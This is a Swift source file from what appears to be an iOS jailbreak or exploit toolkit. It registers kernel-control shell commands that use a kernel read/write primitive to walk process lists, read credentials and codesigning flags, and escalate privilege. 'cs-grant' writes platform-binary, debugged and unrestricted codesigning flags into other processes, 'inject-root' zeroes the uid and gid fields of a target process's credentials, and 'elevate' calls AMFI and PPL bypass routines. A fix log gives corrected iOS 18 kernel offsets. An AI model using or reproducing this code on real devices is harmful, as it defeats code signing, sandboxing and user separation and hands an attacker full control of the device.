//
  //  OmegaExtendedE.swift
  //  lara
  //
  //  Enhanced Kernel Control Shell — Inspection, Linking & Privilege Engines
  //  ─────────────────────────────────────────────────────────────────────────
  //
  //  Commands:
  //    kernel-info          Full kernel environment snapshot
  //    proc-tree            Full process list with kernel addresses
  //    proc-info <pid|name> Deep process inspection (ucred, task, csflags, ents)
  //    thread-list <pid>    Thread list with state for a process
  //    cs-flags <pid>       Read codesigning flags
  //    cs-grant <pid>       Grant CS_PLATFORM_BINARY | CS_DEBUGGED | CS_UNRESTRICTED
  //    inject-root <pid>    Patch ucred uid/gid to 0 in another process
  //    pivot-status         Current privilege elevation summary
  //    kern-regions         Interesting kernel memory region map
  //    smr-read <addr>      Read SMR (hazard-pointer) protected 64-bit pointer
  //    kaddr-info <addr>    Classify an address (kernel text / data / heap / user)
  //    kheap-search <tag>   Search kalloc zones for a 4-char tag
  //    sandbox-check <pid>  Check sandbox status of a process
  //    amfi-status          AMFI enforcement state
  //    help-kernel          List all kernel commands
  //
  //  FIX LOG:
  //    [BUG-1] _allprocs: ptr+0x18 is proc_ro pointer, NOT task.
  //            task lives in proc_ro at off_proc_ro_pr_task.
  //            Fix: read proc_ro first, then task from proc_ro.
  //    [BUG-2] _allprocs: only walked le_next (forward), missed all procs
  //            before our proc in the allproc list.
  //            Fix: walk backward (le_prev) to find list head, then forward.
  //    [BUG-3] proc-info: ucredPtr = p.kaddr + 0x18 + 8 = p.kaddr + 0x20
  //            is wrong — ucred lives in proc_ro, not directly in proc.
  //            Fix: ucred = ds_kreadptr(proc_ro + off_proc_ro_p_ucred).
  //    [BUG-4] inject-root: same wrong ucred offset (p.kaddr + 0x20).
  //            Fix: same — go through proc_ro.
  //

  import Foundation
  import Darwin

  // MARK: – Private helpers

  private func _hex(_ s: String) -> UInt64? {
      let t = s.trimmingCharacters(in: .whitespaces)
      let stripped = (t.hasPrefix("0x") || t.hasPrefix("0X")) ? String(t.dropFirst(2)) : t
      return UInt64(stripped, radix: 16)
  }

  /// Walk allproc list from our proc, return up to `limit` entries
  private struct KProc {
      let kaddr:     UInt64
      let pid:       Int32
      let uid:       UInt32
      let name:      String
      let taskPtr:   UInt64   // real task — read from proc_ro->pr_task [BUG-1 fix]
      let procROPtr: UInt64   // proc_ro pointer — needed for ucred access
  }

  // MARK: [BUG-1 + BUG-2] fixed _allprocs
  // Old code: only walked le_next (forward) and used ptr+0x18 as task (wrong — it's proc_ro).
  // New code: walks backward first (le_prev) to find list head, then forward;
  //           reads proc_ro correctly and extracts task from proc_ro->pr_task.
  private func _allprocs(mgr: laramgr, limit: Int = 512) -> [KProc] {
      // Use exported offsets where available; fall back to iOS 18 arm64e constants.
      let nextOff   = off_proc_p_list_le_next != 0 ? UInt64(off_proc_p_list_le_next) : 0x08
      let prevOff   = off_proc_p_list_le_prev != 0 ? UInt64(off_proc_p_list_le_prev) : 0x00
      let pidOff    = off_proc_p_pid          != 0 ? UInt64(off_proc_p_pid)           : 0x60
      let nameOff   = off_proc_p_name         != 0 ? UInt64(off_proc_p_name)          : 0x56c
      let procROOff = off_proc_p_proc_ro      != 0 ? UInt64(off_proc_p_proc_ro)       : 0x18
      // [BUG-1] task is the FIRST field of proc_ro (pr_task @ +0x00)
      let taskROOff = off_proc_ro_pr_task     != 0 ? UInt64(off_proc_ro_pr_task)      : 0x00
      let uidOff: UInt64 = 0x30  // p_uid — not in offsets.h, constant for iOS 16-18 arm64e

      let startPtr = ds_get_our_proc()
      guard startPtr != 0 else { return [] }

      // [BUG-2] Phase 1: walk backward via le_prev to reach the head of allproc
      var headPtr  = startPtr
      var prevSeen = Set<UInt64>()
      prevSeen.insert(startPtr)
      for _ in 0..<1024 {
          let prev = ds_kreadptr(headPtr + prevOff)
          if prev == 0 || prevSeen.contains(prev) { break }
          prevSeen.insert(prev)
          headPtr = prev
      }

      // Phase 2: walk forward from head, collecting all entries
      var list = [KProc]()
      list.reserveCapacity(512)
      var seen = Set<UInt64>()
      var ptr  = headPtr

      while ptr != 0, !seen.contains(ptr), list.count < limit {
          seen.insert(ptr)

          let pid = Int32(bitPattern: ds_kread32(ptr + pidOff))
          // Skip sentinel entries (pid <= 0)
          guard pid > 0 else {
              ptr = ds_kreadptr(ptr + nextOff)
              continue
          }

          let uid = ds_kread32(ptr + uidOff)

          // Read p_name / p_comm
          var name = ""
          if nameOff != 0 {
              var buf = [UInt8](repeating: 0, count: 33)
              ds_kreadbuf(ptr + nameOff, &buf, 32)
              name = String(bytes: buf.prefix(while: { $0 != 0 }), encoding: .utf8) ?? ""
          }
          if name.isEmpty {
              // Fallback: try alternate known p_comm offsets (iOS 16 vs iOS 18)
              for off: UInt64 in [0x56c, 0x268, 0x2d0] where off != nameOff {
                  var buf = [UInt8](repeating: 0, count: 17)
                  ds_kreadbuf(ptr + off, &buf, 16)
                  let s = String(bytes: buf.prefix(while: { $0 != 0 }), encoding: .utf8) ?? ""
                  if !s.isEmpty { name = s; break }
              }
          }

          // [BUG-1] Read proc_ro pointer, then extract task from proc_ro->pr_task
          let proc_ro = ds_kreadptr(ptr + procROOff)
          let taskPtr = proc_ro != 0 ? ds_kreadptr(proc_ro + taskROOff) : 0

          list.append(KProc(kaddr: ptr, pid: pid, uid: uid, name: name,
                            taskPtr: taskPtr, procROPtr: proc_ro))
          ptr = ds_kreadptr(ptr + nextOff)
      }

      return list
  }

  /// Find a specific process by pid or name
  private func _findProc(arg: String, mgr: laramgr) -> KProc? {
      let procs = _allprocs(mgr: mgr)
      if let pid = Int32(arg) { return procs.first { $0.pid == pid } }
      let lower = arg.lowercased()
      return procs.first { $0.name.lowercased().contains(lower) }
  }

  /// Read CS flags (p_csflags — directly in proc struct on iOS 18)
  private func _readCSFlags(_ proc: KProc) -> UInt32 {
      // p_csflags: try known offsets for iOS 16-18 arm64e
      for off: UInt64 in [0x300, 0x2c4, 0x2e0] {
          let v = ds_kread32(proc.kaddr + off)
          if v != 0 { return v }
      }
      return 0
  }

  // CS flag names
  private let _csNames: [(UInt32, String)] = [
      (0x0001, "VALID"),        (0x0002, "ADHOC"),
      (0x0004, "GET_TASK_ALLOW"), (0x0008, "INSTALLER"),
      (0x0010, "FORCED_LV"),    (0x0020, "INVALID"),
      (0x0040, "HARD"),         (0x0080, "KILL"),
      (0x0100, "CHECK_EXPIRATION"), (0x0200, "RESTRICT"),
      (0x0400, "ENFORCEMENT"),  (0x0800, "REQUIRE_LV"),
      (0x2000, "ENTITLEMENTS_VALIDATED"), (0x4000, "NO_UNTRUSTED_HELPERS"),
      (0x8000, "DEBUGGED"),     (0x10000, "SIGNED"),
      (0x20000, "DEV_CODE"),    (0x100000, "PLATFORM_BINARY"),
      (0x200000, "PLATFORM_PATH"), (0x400000, "DEBUGGER"),
      (0x800000, "ENTITLEMENT_DISK"), (0x4000000, "UNRESTRICTED"),
      (0x80000000, "EXECSEG_MAIN_BINARY"),
  ]

  private func _csDescription(_ flags: UInt32) -> String {
      _csNames.filter { flags & $0.0 != 0 }.map { $0.1 }.joined(separator: " | ")
  }

  // MARK: – Registration

  func registerExtendedECommands() {

      // ── kernel-info ───────────────────────────────────────────────────────────
      OmegaCore.register("kernel-info") { _, mgr in
          guard mgr.dsready else { return .fail("kernel-info: exploit not ready") }
          let kb   = ds_get_kernel_base()
          let ks   = ds_get_kernel_slide()
          let uid  = getuid()
          let gid  = getgid()
          let pid  = getpid()
          let our  = ds_get_our_proc()
          let ourT = ds_get_our_task()

          var osVer = "unknown"
          var buf   = [CChar](repeating: 0, count: 64)
          var sz    = buf.count
          if sysctlbyname("kern.osproductversion", &buf, &sz, nil, 0) == 0 {
              osVer = String(cString: buf)
          }
          var buildBuf = [CChar](repeating: 0, count: 64)
          var buildSz  = buildBuf.count
          var build    = "unknown"
          if sysctlbyname("kern.osversion", &buildBuf, &buildSz, nil, 0) == 0 {
              build = String(cString: buildBuf)
          }

          return .ok(String(format:
              "──────────── kernel-info ────────────\n" +
              "  iOS version  : %@\n" +
              "  build        : %@\n" +
              "  kernel_base  : 0x%016llx\n" +
              "  kernel_slide : 0x%016llx\n" +
              "  our_proc     : 0x%016llx\n" +
              "  our_task     : 0x%016llx\n" +
              "  pid          : %d\n" +
              "  uid          : %d\n" +
              "  gid          : %d\n" +
              "  vfs_ready    : %@\n" +
              "  sbx_ready    : %@\n" +
              "  has_offsets  : %@\n" +
              "─────────────────────────────────────\n",
              osVer, build, kb, ks, our, ourT,
              pid, uid, gid,
              mgr.vfsready ? "yes" : "no",
              mgr.sbxready ? "yes" : "no",
              mgr.hasOffsets ? "yes" : "no"
          ))
      }

      // ── proc-tree ─────────────────────────────────────────────────────────────
      OmegaCore.register("proc-tree") { _, mgr in
          guard mgr.dsready else { return .fail("proc-tree: exploit not ready") }
          let procs = _allprocs(mgr: mgr)
          if procs.isEmpty { return .fail("proc-tree: allproc walk returned 0 entries") }
          var out = String(format: "proc-tree: %d processes\n", procs.count)
          out += "  PID    UID   KADDR               NAME\n"
          out += "  ─────  ───   ──────────────────  ──────────────────────\n"
          for p in procs.sorted(by: { $0.pid < $1.pid }) {
              out += String(format: "  %-6d %-5d 0x%016llx  %@\n",
                            p.pid, p.uid, p.kaddr, p.name)
          }
          return .ok(out)
      }

      // ── proc-info <pid|name> ──────────────────────────────────────────────────
      // [BUG-3] Fixed: ucred lives in proc_ro, NOT at proc+0x20.
      // Old (broken):  ucredPtr = ds_kreadptr(p.kaddr + 0x18 + 8)  // = proc+0x20, wrong!
      // Fixed:         proc_ro  = p.procROPtr
      //                ucredPtr = ds_kreadptr(proc_ro + off_proc_ro_p_ucred)
      OmegaCore.register("proc-info") { rawArg, mgr in
          guard mgr.dsready else { return .fail("proc-info: exploit not ready") }
          let arg = rawArg.trimmingCharacters(in: .whitespaces)
          guard !arg.isEmpty else { return .fail("proc-info: usage — proc-info <pid|name>") }
          guard let p = _findProc(arg: arg, mgr: mgr) else {
              return .fail("proc-info: process '\(arg)' not found")
          }
          let csFlags = _readCSFlags(p)

          // [BUG-3 FIX] ucred is in proc_ro, not directly in proc
          let proc_ro   = p.procROPtr
          // off_proc_ro_p_ucred: exported offset (set by offsets_init); fallback = 0x08
          let ucredROOff = off_proc_ro_p_ucred != 0 ? UInt64(off_proc_ro_p_ucred) : 0x08
          let ucredPtr   = proc_ro != 0 ? ds_kreadptr(proc_ro + ucredROOff) : 0

          // kauth_cred layout on iOS 18 arm64e:
          //   +0x00  TAILQ_ENTRY cr_link (16 bytes)
          //   +0x10  cr_ref (8 bytes)
          //   +0x18  cr_posix.cr_uid
          //   +0x1c  cr_posix.cr_gid
          let ucredUID = ucredPtr != 0 ? ds_kread32(ucredPtr + 0x18) : 0
          let ucredGID = ucredPtr != 0 ? ds_kread32(ucredPtr + 0x1c) : 0

          return .ok(String(format:
              "proc-info: %@ (pid %d)\n" +
              "  kaddr        : 0x%016llx\n" +
              "  proc_ro_ptr  : 0x%016llx\n" +
              "  task_ptr     : 0x%016llx\n" +
              "  uid (proc)   : %d\n" +
              "  ucred_ptr    : 0x%016llx\n" +
              "  ucred_uid    : %d\n" +
              "  ucred_gid    : %d\n" +
              "  cs_flags     : 0x%08x\n" +
              "  cs_flags_str : %@\n",
              p.name, p.pid, p.kaddr, proc_ro, p.taskPtr,
              p.uid, ucredPtr, ucredUID, ucredGID,
              csFlags, _csDescription(csFlags)
          ))
      }

      // ── thread-list <pid|name> ────────────────────────────────────────────────
      OmegaCore.register("thread-list") { rawArg, mgr in
          guard mgr.dsready else { return .fail("thread-list: exploit not ready") }
          let arg = rawArg.trimmingCharacters(in: .whitespaces)
          guard !arg.isEmpty else { return .fail("thread-list: usage — thread-list <pid|name>") }
          guard let p = _findProc(arg: arg, mgr: mgr) else {
              return .fail("thread-list: process '\(arg)' not found")
          }

          var out = String(format: "thread-list: %@ (pid %d)\n", p.name, p.pid)

          var taskPort: mach_port_t = 0
          let taskErr = task_for_pid(mach_task_self_, p.pid, &taskPort)

          if taskErr == KERN_SUCCESS && taskPort != 0 {
              var threadList: thread_act_array_t?
              var threadCount: mach_msg_type_number_t = 0
              let threadsErr = task_threads(taskPort, &threadList, &threadCount)

              if threadsErr == KERN_SUCCESS, let threads = threadList {
                  out += String(format: "  %d thread(s) via task_for_pid\n", threadCount)
                  out += "  #   STATE              MACH-PORT\n"
                  out += "  ─── ─────────────────  ──────────\n"
                  for i in 0 ..< Int(threadCount) {
                      let th = threads[i]
                      var bi    = thread_basic_info()
                      let threadBasicInfoCount = mach_msg_type_number_t(
                          MemoryLayout<thread_basic_info>.size / MemoryLayout<integer_t>.size
                      )
                      var cnt   = threadBasicInfoCount
                      withUnsafeMutablePointer(to: &bi) { ptr in
                          ptr.withMemoryRebound(to: integer_t.self, capacity: Int(cnt)) { buf in
                              _ = thread_info(th, thread_flavor_t(THREAD_BASIC_INFO), buf, &cnt)
                          }
                      }
                      let state: String
                      switch Int32(bi.run_state) {
                      case TH_STATE_RUNNING:         state = "RUNNING"
                      case TH_STATE_STOPPED:         state = "STOPPED"
                      case TH_STATE_WAITING:         state = "WAITING"
                      case TH_STATE_UNINTERRUPTIBLE: state = "UNINTERRUPTIBLE"
                      case TH_STATE_HALTED:          state = "HALTED"
                      default:                       state = "UNKNOWN(\(bi.run_state))"
                      }
                      out += String(format: "  %-3d %-17s  0x%08x\n", i, state, th)
                      mach_port_deallocate(mach_task_self_, th)
                  }
                  _ = vm_deallocate(
                      mach_task_self_,
                      vm_address_t(bitPattern: threadList),
                      vm_size_t(threadCount) * vm_size_t(MemoryLayout<thread_act_t>.size)
                  )
              } else {
                  out += "  task_threads() failed (kr=\(threadsErr))\n"
              }
              mach_port_deallocate(mach_task_self_, taskPort)

          } else {
              out += "  (task_for_pid kr=\(taskErr) — iOS restricts system processes)\n"
              out += String(format: "  task_ptr  : 0x%016llx\n", p.taskPtr)
              if p.taskPtr != 0 {
                  var threadCount: UInt32 = 0
                  for off: UInt64 in [0x2b8, 0x2a8, 0x29c] {
                      let v = ds_kread32(p.taskPtr + off)
                      if v > 0 && v < 2048 { threadCount = v; break }
                  }
                  out += String(format: "  threads   : ~%u (kernel estimate, offset approximate)\n", threadCount)
                  out += "  hint      : use proc-info for full task details\n"
              }
          }

          return .ok(out)
      }

      // ── cs-flags <pid|name> ───────────────────────────────────────────────────
      OmegaCore.register("cs-flags") { rawArg, mgr in
          guard mgr.dsready else { return .fail("cs-flags: exploit not ready") }
          let arg = rawArg.trimmingCharacters(in: .whitespaces)
          guard !arg.isEmpty else { return .fail("cs-flags: usage — cs-flags <pid|name>") }
          guard let p = _findProc(arg: arg, mgr: mgr) else {
              return .fail("cs-flags: process '\(arg)' not found")
          }
          let flags = _readCSFlags(p)
          return .ok(String(format:
              "cs-flags: %@ (pid %d)\n  flags : 0x%08x\n  bits  : %@\n",
              p.name, p.pid, flags, _csDescription(flags)
          ))
      }

      // ── cs-grant <pid|name> ───────────────────────────────────────────────────
      OmegaCore.register("cs-grant") { rawArg, mgr in
          guard mgr.dsready else { return .fail("cs-grant: exploit not ready") }
          let arg = rawArg.trimmingCharacters(in: .whitespaces)
          guard !arg.isEmpty else { return .fail("cs-grant: usage — cs-grant <pid|name>") }
          guard let p = _findProc(arg: arg, mgr: mgr) else {
              return .fail("cs-grant: process '\(arg)' not found")
          }
          // CS_PLATFORM_BINARY | CS_DEBUGGED | CS_UNRESTRICTED
          let grantMask: UInt32 = 0x100000 | 0x8000 | 0x4000000
          var didPatch = false
          for off: UInt64 in [0x300, 0x2c4, 0x2e0] {
              let cur = ds_kread32(p.kaddr + off)
              if cur != 0 {
                  ds_kwrite32(p.kaddr + off, cur | grantMask)
                  let rb = ds_kread32(p.kaddr + off)
                  didPatch = (rb & grantMask) == grantMask
                  break
              }
          }
          if didPatch {
              return .ok("cs-grant: ✔ granted CS_PLATFORM_BINARY|CS_DEBUGGED|CS_UNRESTRICTED to \(p.name) (pid \(p.pid))")
          } else {
              return .fail("cs-grant: ✖ could not locate p_csflags for \(p.name)")
          }
      }

      // ── inject-root <pid|name> ────────────────────────────────────────────────
      // [BUG-4] Fixed: ucred is in proc_ro, NOT at proc+0x20.
      // Old (broken):  ucredPtr = ds_kreadptr(p.kaddr + 0x20)
      // Fixed:         proc_ro  = p.procROPtr
      //                ucredPtr = ds_kreadptr(proc_ro + off_proc_ro_p_ucred)
      OmegaCore.register("inject-root") { rawArg, mgr in
          guard mgr.dsready else { return .fail("inject-root: exploit not ready") }
          let arg = rawArg.trimmingCharacters(in: .whitespaces)
          guard !arg.isEmpty else { return .fail("inject-root: usage — inject-root <pid|name>") }
          guard let p = _findProc(arg: arg, mgr: mgr) else {
              return .fail("inject-root: process '\(arg)' not found")
          }

          // [BUG-4 FIX] ucred is in proc_ro
          let proc_ro    = p.procROPtr
          let ucredROOff = off_proc_ro_p_ucred != 0 ? UInt64(off_proc_ro_p_ucred) : 0x08
          let ucredPtr   = proc_ro != 0 ? ds_kreadptr(proc_ro + ucredROOff) : 0
          guard ucredPtr != 0 else {
              return .fail("inject-root: ucred pointer is null for \(p.name) (proc_ro=0x\(String(format: "%llx", proc_ro)))")
          }

          // kauth_cred field offsets (iOS 18 arm64e):
          //   cr_uid=0x18, cr_ruid=0x1c, cr_svuid=0x20, cr_gid=0x24, cr_rgid=0x28, cr_svgid=0x2c
          let uidOffsets: [(UInt64, String)] = [
              (0x18, "cr_uid"), (0x1c, "cr_ruid"), (0x20, "cr_svuid"),
              (0x24, "cr_gid"), (0x28, "cr_rgid"),  (0x2c, "cr_svgid"),
          ]
          var results = [String]()
          for (off, fname) in uidOffsets {
              let old = ds_kread32(ucredPtr + off)
              ds_kwrite32(ucredPtr + off, 0)
              let rb  = ds_kread32(ucredPtr + off)
              results.append(String(format: "  %@: %u → %u %@", fname, old, rb, rb == 0 ? "✔" : "✖"))
          }

          return .ok(
              "inject-root: \(p.name) (pid \(p.pid))\n" +
              "  proc_ro_ptr : " + String(format: "0x%016llx\n", proc_ro) +
              "  ucred_ptr   : " + String(format: "0x%016llx\n", ucredPtr) +
              results.joined(separator: "\n") + "\n"
          )
      }

      // ── pivot-status ──────────────────────────────────────────────────────────
      OmegaCore.register("pivot-status") { _, mgr in
          guard mgr.dsready else { return .fail("pivot-status: exploit not ready") }
          let uid     = getuid()
          let isRoot  = uid == 0
          let amfiOk  = amfi_is_root()
          // Build a minimal KProc for self to reuse _readCSFlags
          let selfProc = KProc(
              kaddr:     ds_get_our_proc(),
              pid:       getpid(),
              uid:       uid,
              name:      "self",
              taskPtr:   ds_get_our_task(),
              procROPtr: 0   // cs-flags only uses kaddr, so procROPtr not needed here
          )
          let csFlags = _readCSFlags(selfProc)

          return .ok(String(format:
              "──────────── pivot-status ────────────\n" +
              "  uid          : %d  %@\n" +
              "  amfi_is_root : %@\n" +
              "  vfs_ready    : %@\n" +
              "  sbx_ready    : %@\n" +
              "  our_cs_flags : 0x%08x\n" +
              "  cs_bits      : %@\n" +
              "─────────────────────────────────────\n",
              uid, isRoot ? "← ROOT ✔" : "(not root)",
              amfiOk ? "yes" : "no",
              mgr.vfsready ? "yes" : "no",
              mgr.sbxready ? "yes" : "no",
              csFlags, _csDescription(csFlags)
          ))
      }

      // ── kern-regions ──────────────────────────────────────────────────────────
      OmegaCore.register("kern-regions") { _, mgr in
          guard mgr.dsready else { return .fail("kern-regions: exploit not ready") }
          let kb = ds_get_kernel_base()
          let ks = ds_get_kernel_slide()
          let regions: [(String, UInt64)] = [
              ("__TEXT  (kernel text)",  kb),
              ("__DATA  (kernel data)",  kb + 0x0800_0000),
              ("__DATA_CONST",           kb + 0x1000_0000),
              ("allproc (approx)",       ds_get_our_proc()),
              ("our_proc",               ds_get_our_proc()),
              ("our_task",               ds_get_our_task()),
          ]
          var out  = String(format: "kern-regions: kernel_base=0x%llx  slide=0x%llx\n\n", kb, ks)
          out     += "  REGION                    ADDRESS             UNSLID\n"
          out     += "  ─────────────────────────  ─────────────────── ───────────────────\n"
          for (name, addr) in regions {
              let unslid = addr &- ks
              out += String(format: "  %-25@  0x%016llx  0x%016llx\n", name as NSString, addr, unslid)
          }
          return .ok(out)
      }

      // ── smr-read <addr> ───────────────────────────────────────────────────────
      OmegaCore.register("smr-read") { rawArg, mgr in
          guard mgr.dsready else { return .fail("smr-read: exploit not ready") }
          guard let addr = _hex(rawArg.trimmingCharacters(in: .whitespaces)) else {
              return .fail("smr-read: usage — smr-read <addr_hex>")
          }
          let val = ds_kreadsmrptr(addr)
          return .ok(String(format: "smr-read: 0x%016llx → 0x%016llx\n", addr, val))
      }

      // ── kaddr-info <addr> ────────────────────────────────────────────────────
      OmegaCore.register("kaddr-info") { rawArg, mgr in
          guard mgr.dsready else { return .fail("kaddr-info: exploit not ready") }
          guard let addr = _hex(rawArg.trimmingCharacters(in: .whitespaces)) else {
              return .fail("kaddr-info: usage — kaddr-info <addr_hex>")
          }
          let kb = ds_get_kernel_base()
          let ks = ds_get_kernel_slide()
          var region = "unknown"
          if addr >= kb && addr < kb + 0x0800_0000    { region = "__TEXT (kernel code)" }
          else if addr >= kb + 0x0800_0000 && addr < kb + 0x1800_0000 { region = "__DATA (kernel data)" }
          else if addr >= 0xFFFF_FFFF_0000_0000 { region = "kernel virtual space" }
          else if addr < 0x0001_0000_0000_0000  { region = "user space" }

          let valid = ds_isvalid(addr)
          return .ok(String(format:
              "kaddr-info: 0x%016llx\n" +
              "  region   : %@\n" +
              "  unslid   : 0x%016llx\n" +
              "  valid    : %@\n" +
              "  value64  : 0x%016llx\n",
              addr, region, addr &- ks,
              valid ? "yes" : "no / inaccessible",
              valid ? ds_kread64(addr) : 0
          ))
      }

      // ── sandbox-check <pid|name> ──────────────────────────────────────────────
      OmegaCore.register("sandbox-check") { rawArg, mgr in
          guard mgr.dsready else { return .fail("sandbox-check: exploit not ready") }
          let arg = rawArg.trimmingCharacters(in: .whitespaces)
          guard !arg.isEmpty else { return .fail("sandbox-check: usage — sandbox-check <pid|name>") }
          guard let p = _findProc(arg: arg, mgr: mgr) else {
              return .fail("sandbox-check: process '\(arg)' not found")
          }
          let pflags  = ds_kread32(p.kaddr + 0x10)
          let restricted  = (pflags & 0x200) != 0
          let csFlags     = _readCSFlags(p)
          let csRestrict  = (csFlags & 0x200) != 0
          return .ok(String(format:
              "sandbox-check: %@ (pid %d)\n" +
              "  p_flags     : 0x%08x\n" +
              "  P_RESTRICTED: %@\n" +
              "  CS_RESTRICT : %@  (cs_flags=0x%08x)\n",
              p.name, p.pid, pflags,
              restricted ? "YES (sandboxed)" : "NO",
              csRestrict ? "YES" : "NO", csFlags
          ))
      }

      // ── amfi-status ───────────────────────────────────────────────────────────
      OmegaCore.register("amfi-status") { _, mgr in
          guard mgr.dsready else { return .fail("amfi-status: exploit not ready") }
          let enforce = amfi_get_mac_proc_enforce()
          let isRoot  = amfi_is_root()
          return .ok(String(format:
              "amfi-status:\n" +
              "  mac_proc_enforce : %d  (%@)\n" +
              "  amfi_is_root     : %@\n" +
              "  uid              : %d\n",
              enforce,
              enforce == 0 ? "disabled — bypassed ✔" : "enabled",
              isRoot ? "yes ✔" : "no",
              getuid()
          ))
      }

      // ── elevate ───────────────────────────────────────────────────────────────
      OmegaCore.register("elevate") { _, mgr in
          guard mgr.dsready else { return .fail("elevate: exploit not ready") }
          let uidBefore = getuid()
          if uidBefore == 0 { return .ok("elevate: already root — uid=0 ✔") }

          let r = amfi_elevate_to_root()
          let uidAfter = getuid()

          if r == 0 || uidAfter == 0 {
              return .ok(String(format:
                  "elevate: ✔ uid=0 achieved\n" +
                  "  before : uid=%d\n" +
                  "  after  : uid=%d\n" +
                  "  method : amfi_elevate_to_root() → %d\n",
                  uidBefore, uidAfter, r
              ))
          }

          let r2 = ppl_bypass()
          let uidAfter2 = getuid()
          if r2 == 0 || uidAfter2 == 0 {
              return .ok(String(format:
                  "elevate: ✔ uid=0 via ppl_bypass()\n" +
                  "  before : uid=%d\n" +
                  "  after  : uid=%d\n",
                  uidBefore, uidAfter2
              ))
          }

          return .fail(String(format:
              "elevate: ✖ all strategies failed\n" +
              "  amfi_elevate : %d\n" +
              "  ppl_bypass   : %d\n" +
              "  uid          : %d (unchanged)\n",
              r, r2, getuid()
          ))
      }

      // ── help-kernel ───────────────────────────────────────────────────────────
      OmegaCore.register("help-kernel") { _, _ in
          .ok("""
  help-kernel: Kernel Control Commands
  ─────────────────────────────────────────────────────────────────────
    INSPECTION:
      kernel-info                    Full kernel environment snapshot
      proc-tree                      All processes with kernel addresses
      proc-info <pid|name>           Deep process inspection
      thread-list <pid>              Thread list (from proc-tree data)
      pivot-status                   Privilege escalation status
      kern-regions                   Kernel memory region map
      kaddr-info <addr>              Classify a kernel address
      smr-read <addr>                Read SMR-protected pointer
      amfi-status                    AMFI enforcement state
      sandbox-check <pid|name>       Sandbox status of a process

    PATTERN / SEARCH:
      find_pattern <bytes> [--range <s> <e>]   ASLR-independent scan
      kfind_ptr <ptr> [--range <s> <e>]        Scan for pointer value
      kread_range <start> <end>                Hexdump kernel range
      kscan_zero <start> <end>                 Find zero qwords
      kverify <addr> <expected>                Verify kernel value

    SAFE WRITES:
      transaction_write <addr> <val> [--width 8|4|2|1]
      kwrite_safe <addr> <val>                 Alias (width=8)
      kread64/32/16/8 <addr>                   Raw kernel reads
      kwrite64/32/16/8 <addr> <val>            Raw kernel writes (use carefully)

    PRIVILEGE:
      elevate                        Elevate to root (all strategies)
      cs-flags <pid|name>            Read CS flags
      cs-grant <pid|name>            Grant full CS permissions
      inject-root <pid|name>         Inject uid=0 into target process
  ─────────────────────────────────────────────────────────────────────
  """)
      }
  }
  